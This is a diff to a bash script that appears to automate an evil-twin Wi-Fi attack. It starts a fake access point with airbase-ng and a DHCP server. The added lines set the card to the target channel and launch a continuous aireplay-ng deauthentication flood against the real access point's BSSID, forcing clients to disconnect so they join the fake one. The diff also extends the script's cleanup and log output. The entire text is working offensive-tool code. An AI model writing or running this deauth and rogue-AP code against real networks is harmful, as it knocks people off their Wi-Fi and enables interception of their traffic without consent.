@@ -636,6 +636,7 @@ cleanup() {
     echo ""
     echo -e "${WHITE}[${GREEN}+${WHITE}]${GREEN} Cleaning up...${WHITE}"
     pkill -f "airbase-ng" 2>/dev/null || true
+    pkill -f "aireplay-ng" 2>/dev/null || true
     pkill -f "dhcpd" 2>/dev/null || true
     for iface in $(ip -o link show | grep -o 'at[0-9]*'); do
         ip link set "${iface}" down 2>/dev/null || true
@@ -754,6 +755,10 @@ main() {
 
                     echo -e "${WHITE}[${GREEN}+${WHITE}]${GREEN} Starting DHCP server...${WHITE}"
                     run_background "dhcpd -d -cf \"${TMP_DIR}/${DHCPD_FILE}\" at0 2>&1 | tee -a ${TMP_DIR}/clts.txt" "dhcpd"
+
+                    echo -e "${WHITE}[${GREEN}+${WHITE}]${GREEN} Deauthing clients from real AP...${WHITE}"
+                    iwconfig ${wlan} channel ${selected_channel}
+                    run_background "aireplay-ng -0 0 -a ${selected_bssid} ${wlan} --ignore-negative-one" "aireplay-ng"
                     echo ""
                     echo -e "${WHITE}[${GREEN}✓${WHITE}]${GREEN} Attack running! Fake AP: ${BOLD_YELLOW}${selected_essid}${GREEN} on ${BOLD_PURPLE}at0${WHITE}"
                     if [ -n "${lan}" ]; then
@@ -761,7 +766,7 @@ main() {
                     else
                         echo -e "${WHITE}[${RED}!${WHITE}]${GREEN} Internet access: ${BOLD_RED}Disabled${WHITE}"
                     fi
-                    echo -e "${WHITE}[${YELLOW}i${WHITE}]${GREEN} Check logs: ${BOLD_CYAN}./tmp/airbase-ng.log${GREEN}, ${BOLD_CYAN}./tmp/dhcpd.log${WHITE}"
+                    echo -e "${WHITE}[${YELLOW}i${WHITE}]${GREEN} Check logs: ${BOLD_CYAN}./tmp/{airbase-ng,dhcpd,aireplay-ng}.log${WHITE}"
                     echo ""
                     echo -e "${WHITE}[${YELLOW}i${WHITE}]${GREEN} Press ${BOLD_YELLOW}Enter${GREEN} to stop the attack and clean up.${WHITE}"
                     read
